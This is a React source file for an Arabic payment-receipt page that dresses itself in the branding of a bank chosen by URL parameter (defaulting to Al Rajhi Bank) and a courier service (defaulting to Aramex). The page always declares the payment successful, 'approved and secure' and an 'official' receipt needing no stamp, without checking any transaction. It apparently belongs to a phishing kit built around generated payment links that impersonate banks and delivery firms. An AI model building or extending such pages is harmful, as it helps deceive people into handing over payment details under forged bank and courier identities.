import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { useLinkData } from "@/hooks/useLinkData";
import { CheckCircle2, Download, Share2, ArrowRight, Printer, ShieldCheck, Calendar, Hash, CreditCard, Building2, User } from "lucide-react";
import { bankBranding } from "@/lib/brandingSystem";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { getServiceBranding } from "@/lib/serviceLogos";

const PaymentReceiptPage = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);

  const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
  const selectedBankBranding = (selectedBankId && bankBranding[selectedBankId]) ? bankBranding[selectedBankId] : bankBranding.default || bankBranding.alrajhi_bank;
  const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;
  const branding = getServiceBranding(linkData?.payload?.service_key || "aramex");
  
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);
  const selectedCountryData = getCountryByCode(selectedCountry);

  if (linkLoading || !linkData) return null;

  const primaryColor = selectedBankBranding.colors.primary;
  const secondaryColor = selectedBankBranding.colors.secondary;
  const refNumber = `TRX-${id?.slice(0, 8).toUpperCase()}`;

  return (
    <div className="min-h-screen flex flex-col bg-slate-50" dir="rtl" style={{ fontFamily: selectedBankBranding.fonts.arabic }}>
      <PaymentMetaTags
        serviceKey={selectedBankId ? `bank_${selectedBankId}` : "bank"}
        serviceName={selectedBank?.nameAr || "البنك"}
        title="إيصال الدفع الإلكتروني"
      />

      <header className="bg-white border-b-4 h-16 sm:h-20 flex items-center sticky top-0 z-50 shadow-md" style={{ borderBottomColor: primaryColor }}>
         <div className="container mx-auto px-4 flex items-center justify-between">
            <div className="w-32 sm:w-40 h-10 flex items-center">
               {selectedBankId ? (
                 <BankLogo bankId={selectedBankId} bankName={selectedBank?.name || ""} bankNameAr={selectedBank?.nameAr || ""} size="md" />
               ) : (
                 <div className="flex items-center gap-2 text-primary font-black">
                   <ShieldCheck className="w-6 h-6" />
                   <span>SECURE RECEIPT</span>
                 </div>
               )}
            </div>
            <div className="flex items-center gap-4">
               <button onClick={() => window.print()} className="p-2 text-gray-400 hover:text-primary transition-colors">
                  <Printer className="w-5 h-5" />
               </button>
               <div className="h-6 w-px bg-gray-200" />
               <Button variant="ghost" size="sm" className="font-bold text-xs" onClick={() => navigate('/')}>
                  خروج
               </Button>
            </div>
         </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-12 max-w-xl">
         <div className="text-center mb-10 space-y-4">
            <div className="w-24 h-24 rounded-full bg-green-50 flex items-center justify-center mx-auto shadow-inner border border-green-100 animate-in zoom-in duration-700">
               <CheckCircle2 className="w-14 h-14 text-green-500" />
            </div>
            <div className="space-y-1">
               <h1 className="text-3xl font-black text-slate-900 tracking-tight">تمت العملية بنجاح</h1>
               <p className="text-sm font-bold text-gray-400 uppercase tracking-widest">Payment Successfully Processed</p>
            </div>
         </div>

         <Card className="border-none shadow-[0_40px_100px_-20px_rgba(0,0,0,0.1)] rounded-[3rem] overflow-hidden bg-white relative print:shadow-none">
            <div className="absolute top-0 left-0 w-full h-2" style={{ backgroundColor: primaryColor }} />

            <div className="p-10 sm:p-12 text-center border-b border-dashed bg-slate-50/50">
               <p className="text-[11px] font-black text-slate-400 uppercase tracking-[0.2em] mb-3">قيمة العملية</p>
               <h2 className="text-5xl font-black text-slate-900 tracking-tighter mb-4">{formattedAmount}</h2>
               <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-green-50 text-green-700 border border-green-100 text-[10px] font-black">
                  <ShieldCheck className="w-3.5 h-3.5" />
                  <span>عملية معتمدة وآمنة</span>
               </div>
            </div>

            <div className="p-10 sm:p-12 space-y-8">
               <div className="grid grid-cols-1 gap-6">
                  <div className="flex items-center justify-between py-1">
                     <div className="flex items-center gap-3 text-slate-400">
                        <Hash className="w-4 h-4" />
                        <span className="text-[11px] font-black uppercase tracking-wider">رقم المرجع</span>
                     </div>
                     <span className="font-bold text-slate-700 font-mono">{refNumber}</span>
                  </div>

                  <div className="flex items-center justify-between py-1 border-t border-slate-50 pt-6">
                     <div className="flex items-center gap-3 text-slate-400">
                        <Calendar className="w-4 h-4" />
                        <span className="text-[11px] font-black uppercase tracking-wider">التاريخ والوقت</span>
                     </div>
                     <span className="font-bold text-slate-700">{new Date().toLocaleString('ar-SA')}</span>
                  </div>

                  <div className="flex items-center justify-between py-1 border-t border-slate-50 pt-6">
                     <div className="flex items-center gap-3 text-slate-400">
                        <Building2 className="w-4 h-4" />
                        <span className="text-[11px] font-black uppercase tracking-wider">الجهة المستفيدة</span>
                     </div>
                     <span className="font-bold text-slate-700">{linkData?.payload?.service_name || branding.name}</span>
                  </div>

                  <div className="flex items-center justify-between py-1 border-t border-slate-50 pt-6">
                     <div className="flex items-center gap-3 text-slate-400">
                        <User className="w-4 h-4" />
                        <span className="text-[11px] font-black uppercase tracking-wider">اسم العميل</span>
                     </div>
                     <span className="font-bold text-slate-700">{linkData?.payload?.customerInfo?.name || linkData?.payload?.customerInfo?.fullName || 'غير متوفر'}</span>
                  </div>

                  <div className="flex items-center justify-between py-1 border-t border-slate-50 pt-6">
                     <div className="flex items-center gap-3 text-slate-400">
                        <CreditCard className="w-4 h-4" />
                        <span className="text-[11px] font-black uppercase tracking-wider">طريقة الدفع</span>
                     </div>
                     <span className="font-bold text-slate-700">{selectedBank?.nameAr || 'بطاقة بنكية'}</span>
                  </div>
               </div>

               <div className="pt-10 flex gap-4 print:hidden">
                  <Button className="flex-1 h-16 rounded-2xl font-black text-lg shadow-xl gap-3" style={{ backgroundColor: primaryColor }}>
                     <Download className="w-5 h-5" />
                     <span>حفظ الإيصال</span>
                  </Button>
                  <Button variant="outline" className="h-16 w-16 rounded-2xl border-2 hover:bg-slate-50 transition-colors">
                     <Share2 className="w-6 h-6 text-slate-400" />
                  </Button>
               </div>
            </div>

            <div className="bg-slate-50 p-8 text-center space-y-4">
               <div className="flex items-center justify-center gap-3 opacity-40 grayscale h-5">
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-full" />
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-full" />
               </div>
               <p className="text-[9px] font-bold text-slate-400 uppercase tracking-[0.3em]">Official Digital Payment Receipt</p>
            </div>
         </Card>

         <div className="mt-12 flex flex-col items-center gap-6 print:hidden">
            <Button variant="link" className="font-black text-slate-400 hover:text-primary transition-colors flex items-center gap-2" onClick={() => navigate('/')}>
               <span>العودة للرئيسية</span>
               <ArrowRight className="w-4 h-4" />
            </Button>
            <div className="flex items-center gap-3 p-4 bg-white/50 rounded-2xl border border-dashed text-slate-400">
               <ShieldCheck className="w-5 h-5 text-primary" />
               <p className="text-[10px] font-bold leading-relaxed uppercase tracking-tighter">إيصال إلكتروني موثق لا يحتاج إلى ختم أو توقيع.</p>
            </div>
         </div>
      </main>
    </div>
  );
};

export default PaymentReceiptPage;
